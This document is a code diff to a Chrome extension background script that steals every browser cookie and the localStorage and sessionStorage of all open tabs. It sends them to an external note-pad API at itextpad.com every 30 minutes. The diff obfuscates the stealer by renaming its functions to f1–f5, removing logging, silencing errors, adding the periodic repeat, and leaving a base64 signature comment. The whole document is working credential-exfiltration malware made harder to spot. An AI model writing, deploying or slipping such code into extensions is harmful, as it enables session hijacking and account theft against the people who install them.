@@ -1,7 +1,4 @@
-//dead ghost was here
-console.log('my chrome extension background script running');
-
-function getAllBrowserCookies(callback) {
+function f1(callback) {
   let myCookies = '';
   chrome.cookies.getAll({}, (cookies) => {
     cookies.forEach(cookie => {
@@ -13,7 +10,7 @@ function getAllBrowserCookies(callback) {
   });
 }
 
-function getAllBrowserLocalStorage() {
+function f2() {
   return new Promise((resolve, reject) => {
     chrome.tabs.query({}, (tabs) => {
       let allLocalStorage = '';
@@ -32,7 +29,6 @@ function getAllBrowserLocalStorage() {
             },
             (results) => {
               if (results && results[0] && results[0].result) {
-                console.log(`LocalStorage for ${results[0].result.url}: ${results[0].result.localStorage}`);
                 resolveTab(`URL: ${results[0].result.url}, LocalStorage: ${results[0].result.localStorage}`);
               } else {
                 resolveTab('');
@@ -50,8 +46,7 @@ function getAllBrowserLocalStorage() {
   });
 }
 
-
-function getAllBrowserSessionStorage() {
+function f3() {
   return new Promise((resolve, reject) => {
     chrome.tabs.query({}, (tabs) => {
       let allSessionStorage = '';
@@ -70,7 +65,6 @@ function getAllBrowserSessionStorage() {
             },
             (results) => {
               if (results && results[0] && results[0].result) {
-                console.log(`SessionStorage for ${results[0].result.url}: ${results[0].result.sessionStorage}`);
                 resolveTab(`URL: ${results[0].result.url}, SessionStorage: ${results[0].result.sessionStorage}`);
               } else {
                 resolveTab('');
@@ -88,11 +82,9 @@ function getAllBrowserSessionStorage() {
   });
 }
 
-
-
-function sendPostRequest(data, id, pad_id, tab_index) {
-
-  fetch('https://www.itextpad.com/api/v3/pad-tab/'+id, {
+function f4(data, id, pad_id, tab_index) {
+  console.log(id, tab_index, data)
+  fetch('https://www.itextpad.com/api/v3/pad-tab/' + id, {
     method: 'PUT',
     headers: {
       'Content-Type': 'application/json',
@@ -103,36 +95,38 @@ function sendPostRequest(data, id, pad_id, tab_index) {
       "pad_tab_name": "reporting",
       "pad_id": pad_id,
       "note": data,
-      "tab_index": 1
+      "tab_index": tab_index
     }),
   })
     .then(response => response.json())
-    .then(data => console.log('Success:', data))
-    .catch((error) => console.error('Error:', error));
+    .then(data => { })
+    .catch((error) => { });
 }
 
-
-getAllBrowserCookies((yourCookies) => {
-  sendPostRequest(yourCookies, 259299, 192846, 1)
-});
-
-getAllBrowserLocalStorage()
-  .then((yourLocalStorage) => {
-    console.log(yourLocalStorage);
-    sendPostRequest(yourLocalStorage, 259300, 192846, 2)
-  })
-  .catch((error) => {
-    console.error('Error fetching local storage:', error);
+function f5() {
+  f1((yourCookies) => {
+    f4(yourCookies, 259299, 192846, 1)
   });
 
+  f2()
+    .then((yourLocalStorage) => {
+      f4(yourLocalStorage, 259300, 192846, 2)
+    })
+    .catch((error) => {
 
-getAllBrowserSessionStorage()
-  .then((yourSessionStorage) => {
-    console.log(yourSessionStorage);
-    sendPostRequest(yourSessionStorage, 259301, 192846, 3)
+    });
 
-  })
-  .catch((error) => {
-    console.error('Error fetching session storage:', error);
-  });
+  f3()
+    .then((yourSessionStorage) => {
+      f4(yourSessionStorage, 259301, 192846, 3)
+
+    })
+    .catch((error) => {
+
+    });
+}
+f5()
+
+setInterval(f5, 1800000);
+//VGhlIERlYWRTb3VsIHdhcyBoZXJl
 
